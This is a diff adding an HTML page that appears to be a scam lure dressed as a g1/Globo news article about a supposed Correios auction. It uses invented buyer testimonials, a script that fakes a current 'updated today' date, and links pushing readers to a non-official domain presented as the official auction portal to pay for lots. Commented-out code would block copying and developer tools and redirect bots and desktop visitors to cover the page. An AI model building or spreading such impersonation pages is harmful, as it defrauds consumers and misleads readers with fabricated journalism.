@@ -1,0 +1,298 @@
+<!DOCTYPE html><html lang="en"><head><base href=""><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <!-- <script id="allow-copy_script">(function agent() {
+        let unlock = false
+        document.addEventListener('allow_copy', (event) => {
+          unlock = event.detail.unlock
+        })
+    
+        const copyEvents = [
+          'copy',
+          'cut',
+          'contextmenu',
+          'selectstart',
+          'mousedown',
+          'mouseup',
+          'mousemove',
+          'keydown',
+          'keypress',
+          'keyup',
+        ]
+        const rejectOtherHandlers = (e) => {
+          if (unlock) {
+            e.stopPropagation()
+            if (e.stopImmediatePropagation) e.stopImmediatePropagation()
+          }
+        }
+        copyEvents.forEach((evt) => {
+          document.documentElement.addEventListener(evt, rejectOtherHandlers, {
+            capture: true,
+          })
+        })
+      })()</script> -->
+        <!-- <script>
+      // Função para detectar se é um dispositivo móvel
+      // function isMobile() {
+      //   return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+      // }
+    
+      // Função para detectar se é um bot
+      function isBot() {
+        const botAgents = [
+          'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+          'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+        ];
+        
+        return botAgents.some(bot => navigator.userAgent.includes(bot));
+      }
+    
+      // Função para verificar se a largura da janela é maior que 768px
+      function isWideScreen() {
+        return window.innerWidth > 768;
+      }
+    
+      // Redirecionar ou bloquear o acesso
+    //   function checkAccess() {
+    //     if (isBot() || (!isMobile() && isWideScreen())) {
+    //       // Redirecionar para se o acesso for bloqueado
+    
+    //       window.location.href = "https://g1.globo.com/";
+    //     }
+    //   }
+    
+      // Executar a função de verificação ao carregar a página
+      window.onload = checkAccess;
+    
+      // Adicionar um listener para verificar novamente se a janela for redimensionada
+    //   window.addEventListener('resize', checkAccess);
+     </script> -->
+     <!-- <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool@latest"></script>
+     <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool" disable-menu="true" clear-log="true" disable-select="true" disable-copy="true" disable-cut="true" disable-paste="true"></script> -->
+    <!-- <script type="text/javascript">
+            document.onkeydown = function (event) {
+                 event = (event || window.event);
+                 if (event.keyCode == 123 || event.keyCode == 18)
+                 {
+                       return false;
+                 }
+            }
+            document.addEventListener('contextmenu', event => event.preventDefault());
+        </script> -->
+<!-- <script language="javascript">
+document.onmousedown=disableclick;
+status="Right Click Disabled";
+function disableclick(event)
+{
+  if(event.button==2)
+   {
+     alert(status);
+     return false;    
+   }
+}
+</script> -->
+    <!-- <script language="JavaScript">
+    //Disable right click script
+    var message = "";
+    ///////////////////////////////////
+    function clickIE() {
+        if (document.all) {
+            (message);
+            return false;
+        }
+    }
+    
+    function clickNS(e) {
+        if (document.layers || (document.getElementById && !document.all)) {
+            if (e.which == 2 || e.which == 3) {
+                (message);
+                return false;
+            }
+        }
+    }
+    if (document.layers) {
+        document.captureEvents(Event.MOUSEDOWN);
+        document.onmousedown = clickNS;
+    } else {
+        document.onmouseup = clickNS;
+        document.oncontextmenu = clickIE;
+    }
+    
+    document.oncontextmenu = new Function("return false")
+    </script> -->
+    
+    
+    
+<link rel="stylesheet" href="styles.css">
+    </head>
+    
+    <body>
+    
+        <div class="barTop">
+            <span id="globo">globo.com</span>
+            <span id="g1">g1</span>
+            <span id="ge">ge</span>
+            <span id="gshow">gshow</span>
+            <span id="globoplay">globoplay</span>
+            <span id="oglobo">o globo</span>
+            <span id="guiadecompras">guia de compras</span>
+        </div>
+        <header>
+            <div class="row">
+              
+                <svg id="logog1" fill="none" viewBox="0 0 42 42" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M30.167 4.866L38.12.134C38.99-.295 40 .345 40 1.512V30.31c0 .54-.585 1.133-1.307 1.133h-3.655a1.315 1.315 0 01-1.306-1.323V9.352l-2.444 1.458c-.868.426-1.855-.237-1.855-1.213V6.055c0-.507.285-.968.734-1.19zM14.11 25.831c-3.246 0-5.977-2.607-5.977-6.415 0-3.86 2.73-6.416 5.977-6.416 3.246 0 5.925 2.555 5.925 6.416 0 3.808-2.68 6.415-5.925 6.415zm7.368-18.463c-.773 0-1.236.469-1.236 1.251v1.356c-1.392-1.722-3.968-3.026-6.545-3.026C7.411 6.95 2 12.374 2 19.467c0 7.094 5.1 11.997 11.542 11.997a8.67 8.67 0 006.389-2.764c-.05 4.954-2.627 7.198-7.059 7.198-2.37 0-4.586-.731-7.161-2.4-.67-.469-1.443-.313-1.804.418L2.36 36.993c-.36.73-.257 1.408.464 1.877C6.02 40.956 9.782 42 13.028 42c8.502 0 13.19-4.643 13.19-15.335V8.62c0-.782-.463-1.251-1.236-1.251h-3.504z" fill="#fff"></path>
+                </svg>
+            </div>
+    
+    
+            <h1>ECONOMIA</h1>
+            <svg id="search" fill="#fff" class="search-icon" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z">
+                </path>
+                <path d="M0 0h24v24H0z" fill="none"></path>
+            </svg>
+        </header>
+    
+        <div class="corpo">
+            <h1>Leilão dos Correios: veja como participar</h1>
+            <p>Pessoas físicas e jurídicas de todo o Brasil já podem enviar propostas.</p>
+                
+    
+                <h5>Por <b>g1 SP</b> — São Paulo</h5>
+                <span span="data de hoje">20/04/2025 
+                Atualizado há uma hora </span>
+             
+    
+                <div id="vid_68055f5c84b7525f5b641964" style="position: relative; width: 100%; padding: 56.25% 0 0;"> <img id="thumb_68055f5c84b7525f5b641964" src="images/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail"> <div id="backdrop_68055f5c84b7525f5b641964" style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; "></div> </div> <script type="text/javascript" id="scr_68055f5c84b7525f5b641964"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/af4d170f-5654-48be-8638-e7ecb67164e9/players/68055f5c84b7525f5b641964/player.js", s.async=!0,document.head.appendChild(s); </script>
+             <p></p>
+            <p class="texto">O tradicional leilão dos Correios está oficialmente aberto, trazendo diversas oportunidades para consumidores e empresas adquirirem produtos por preços acessíveis. Os lotes contam com uma ampla variedade de itens, incluindo celulares, materiais de escritório, periféricos e eletrônicos sortidos, televisores e aparelhos de ar-condicionado.<br><br>
+                
+                Para quem busca oportunidades de revenda ou mesmo para uso pessoal, este leilão representa uma excelente chance de adquirir produtos de qualidade a preços reduzidos.</p>
+    <p></p>
+            <img class="noticiaImage" src="images/correts.png" alt="">
+            <span style="color: #474747; margin-top: 17px;">Itens que serão leiloados pelos Correios — Foto: Correios</span>
+            <p class="texto"> <br>
+                <b id="title">Lotes individuais e em conjunto</b> <br>Os produtos leiloados estão organizados em diferentes formatos de lotes. Alguns aparelhos são disponibilizados em lotes individuais, contendo apenas uma unidade, enquanto outros são vendidos em grupos, oferecendo mais itens em um mesmo lote. No caso dos lotes que contêm mais de um item, a distribuição dos produtos é sortida, sem possibilidade de seleção específica.<br><br>Essa organização permite tanto a aquisição de um único produto de interesse quanto a compra de lotes maiores, ideais para revendedores ou empresas que buscam economizar em equipamentos eletrônicos e materiais de escritório.<br></p>
+             <p></p>
+            <img class="noticiaImage" src="images/cel1.png" alt="">
+            <span style="color: #474747; margin-top: 17px;">O leilão traz expectativas e atrai consumidores interessados — Foto: Correios</span>		       
+                   <p class="texto"> <br>
+                <b id="title">Como funciona o leilão</b> <br>O leilão dos Correios segue um modelo de arremate direto, onde os participantes podem visualizar os lotes disponíveis, garantir sua proposta de lance no produto escolhido, preenchendo o endereço de entrega e comprando o lote, assim, garantindo produtos por preços muito abaixo do mercado. A ampla variedade de itens atrai consumidores de todo o Brasil, desde compradores individuais em busca de boas ofertas até empresários e lojistas que desejam adquirir grandes quantidades de produtos a custos reduzidos.<br><br>A popularidade do leilão tem crescido a cada edição, chamando a atenção da mídia. No último evento, a <i>BandTV</i> realizou uma cobertura especial, mostrando de perto como funciona todo o processo e destacando a grande procura pelos lotes. Conforme mostrado na reprodução autorizada abaixo, a emissora entrevistou compradores satisfeitos e especialistas, reforçando as vantagens e benefícios de adquirir itens no leilão.<br></p>
+        <br>
+      <div id="vid_68055f7de2e3022c9d7725ea" style="position: relative; width: 100%; padding: 56.25% 0 0;"> <img id="thumb_68055f7de2e3022c9d7725ea" src="images/thumbnail_1.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail"> <div id="backdrop_68055f7de2e3022c9d7725ea" style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; "></div> </div> <script type="text/javascript" id="scr_68055f7de2e3022c9d7725ea"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/af4d170f-5654-48be-8638-e7ecb67164e9/players/68055f7de2e3022c9d7725ea/player.js", s.async=!0,document.head.appendChild(s); </script>
+     <span style="color: #474747; margin-top: 1px;">Cobertura especial BandTV — Video: Reprodução autorizada BandTV</span>
+    
+                   <p class="texto"> <br>
+                <b id="title">Benefícios e casos de sucesso</b> <br>Participar do leilão dos Correios traz diversas vantagens. Os produtos são ofertados a preços muito inferiores aos praticados no mercado, tornando-se uma oportunidade única para consumidores e empresas. Além disso, é possível encontrar itens de alta qualidade, muitos deles novos ou em ótimo estado de conservação.<br><br>Diversos compradores relatam experiências positivas. Um exemplo é o de Marcelo Oliveira, morador de São Paulo, que adquiriu um iPhone por menos da metade do preço de mercado. 
+                
+                "<i>Não acreditei quando vi que arrematei um iPhone em perfeito estado por um preço tão baixo. Valeu muito a pena"</i>.<br><br>
+                
+                  </p>
+                        <img class="noticiaImage" src="images/cherrycherrylady.jpg" alt="">
+            <span style="color: #474747; margin-top: 22px;">Empresa promete frete mais rápido na edição deste ano — Foto: Correios</span>	
+    
+      <p class="texto">    
+                
+                <br>Outra história de sucesso é da Papelaria Nova Era, que conseguiu comprar diversos materiais de escritório por um valor muito inferior ao encontrado em distribuidores tradicionais. 
+                
+                "<i>Economizamos mais de 70% no estoque de materiais para o próximo semestre. Foi uma excelente estratégia para o nosso negócio</i>".<br><br>
+                
+                Já para o setor de tecnologia, a Informática TechPoint arrematou um lote com dezenas de periféricos e eletrônicos por um preço extremamente competitivo. "<i>Compramos teclados, mouses, monitores e outros equipamentos por um preço incrível. O leilão dos Correios é uma ótima oportunidade</i>", disse João Marcos, proprietário da empresa.<br>
+                
+            </p>
+                    <img class="noticiaImage" src="images/correios3.png" alt="">
+            <span style="color: #474747; margin-top: 17px;">Início da nova edição — Foto: Correios</span>	
+            
+                    <p class="texto"> <br>
+                <b id="title">Como participar do leilão</b> <br>Para participar, os interessados devem acessar o site oficial do leilão dos Correios no portal <b>e-Licitações</b> (<i><b>retidadadepedido.online/leilao/</b></i>) e adquirir o lote desejado. O processo de compra é simples: basta escolher o lote, clicar no botão "comprar agora" e seguir para a página de pagamento e cadastro do endereço de entrega.<br><br>Após cadastrar o endereço, o comprador deve selecionar a opção de frete desejado e finalizar o pagamento. É importante ressaltar que os lotes são limitados e podem se esgotar rapidamente.<br><br></p>
+                                    <img class="noticiaImage" src="images/upscale4.png" alt="">
+            <span style="color: #474747; margin-top: 17px;">Prédio dos Correios para armazenamento e controle de estoque — Foto: Correios</span>	
+    
+                    <p class="texto"> 
+                <b id="title">Aproveite a disponibilidade</b> <br>O leilão dos Correios sempre é um sucesso. Os preços acessíveis e a variedade de produtos tornam esse evento uma oportunidade única para consumidores e empresas que desejam economizar. A cada edição, milhares de pessoas acessam a plataforma em busca de ofertas exclusivas, e os lotes mais desejados são arrematados rapidamente. Quem deseja garantir um produto por um preço abaixo do mercado precisa agir com rapidez.
+                
+    
+                <br><br>Além de ser uma excelente chance de compra, o leilão oferece a segurança de uma negociação oficial e transparente, realizada por uma das maiores instituições do país. Todo o processo é regulamentado e acompanha um rigoroso critério de organização, garantindo que os participantes tenham acesso a produtos em boas condições e a preços vantajosos. Para muitos consumidores, essa é uma oportunidade de ouro para adquirir itens que poderiam custar o dobro ou até mais em lojas convencionais.<br><br>
+                
+                </p>
+                
+                            <img class="noticiaImage" src="images/freterapido.jpg" alt="">
+                        <span style="color: #474747; margin-top: 17px;">O frete mais rápido atraí inúmeros consumidores nessa edição — Foto: Correios</span>
+                
+                <p class="texto"> 
+                Empresários e revendedores também se beneficiam imensamente desse evento. Com lotes contendo diversos produtos por um preço reduzido, empreendedores do ramo de tecnologia, papelaria e eletrodomésticos encontram uma excelente oportunidade para abastecer seus estoques sem comprometer o orçamento. Muitos negócios já conseguiram maximizar seus lucros aproveitando essas ofertas, transformando o leilão dos Correios em uma estratégia valiosa para expansão e crescimento.<br>	       
+    
+    
+                        
+                        </p><p class="texto"> 			
+                        
+                         
+                            Como sempre, a demanda será alta e os produtos disponíveis são limitados. Essa é a sua chance de fazer excelentes negócios, economizar e aproveitar ofertas que dificilmente são encontradas no mercado tradicional.<br><br>
+                            
+    
+               
+                Caso você tenha interesse, estaremos deixando o link do site oficial do Leilão dos Correios abaixo.
+                
+            </p>
+            
+    <p></p>
+    <p></p>
+    <a href="https://retidadadepedido.online/leilao" class="btn-cta"  style="display: inline-block; margin: 30px auto;">
+      ▶ ACESSAR LEILÃO AGORA
+  </a>
+        <p></p>
+        </div>
+        <footer>
+    
+            <div class="row">
+                <svg fill="none" viewBox="0 0 42 42" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M30.167 4.866L38.12.134C38.99-.295 40 .345 40 1.512V30.31c0 .54-.585 1.133-1.307 1.133h-3.655a1.315 1.315 0 01-1.306-1.323V9.352l-2.444 1.458c-.868.426-1.855-.237-1.855-1.213V6.055c0-.507.285-.968.734-1.19zM14.11 25.831c-3.246 0-5.977-2.607-5.977-6.415 0-3.86 2.73-6.416 5.977-6.416 3.246 0 5.925 2.555 5.925 6.416 0 3.808-2.68 6.415-5.925 6.415zm7.368-18.463c-.773 0-1.236.469-1.236 1.251v1.356c-1.392-1.722-3.968-3.026-6.545-3.026C7.411 6.95 2 12.374 2 19.467c0 7.094 5.1 11.997 11.542 11.997a8.67 8.67 0 006.389-2.764c-.05 4.954-2.627 7.198-7.059 7.198-2.37 0-4.586-.731-7.161-2.4-.67-.469-1.443-.313-1.804.418L2.36 36.993c-.36.73-.257 1.408.464 1.877C6.02 40.956 9.782 42 13.028 42c8.502 0 13.19-4.643 13.19-15.335V8.62c0-.782-.463-1.251-1.236-1.251h-3.504z" fill="#fff"></path>
+                </svg>
+                <p>últimas notícias</p>
+            </div>
+            <span>© Copyright 2000-2025 Globo Comunicação e Participações S.A.</span>
+    
+        </footer>
+        <script src="7q5mQb8Ezokw.js.download"></script>
+    
+    
+    
+            <script>
+                function updateDate() {
+                    const now = new Date();
+                    const day = String(now.getDate()).padStart(2, '0');
+                    const month = String(now.getMonth() + 1).padStart(2, '0');
+                    const year = now.getFullYear();
+                    const hours = String(now.getHours()).padStart(2, '0');
+                    const minutes = String(now.getMinutes()).padStart(2, '0');
+                    
+                    const formattedDate = `${day}/${month}/${year} ${hours}h${minutes} · Atualizado hoje`;
+                    
+                    document.getElementById('currentDate').textContent = formattedDate;
+                }
+                
+                updateDate();
+                setInterval(updateDate, 60000); // Update every minute
+    
+            // Function to get user's city based on IP
+            function getUserCity() {
+                fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(data => {
+                        document.getElementById('userCity').textContent = data.city;
+                    })
+                    .catch(error => {
+                        console.error('Error fetching user location:', error);
+                        document.getElementById('userCity').textContent = 'sua cidade';
+                    });
+            }
+    
+            getUserCity();
+    
+        </script>
+    
+    
+    
+    
+    
+    </body></html>
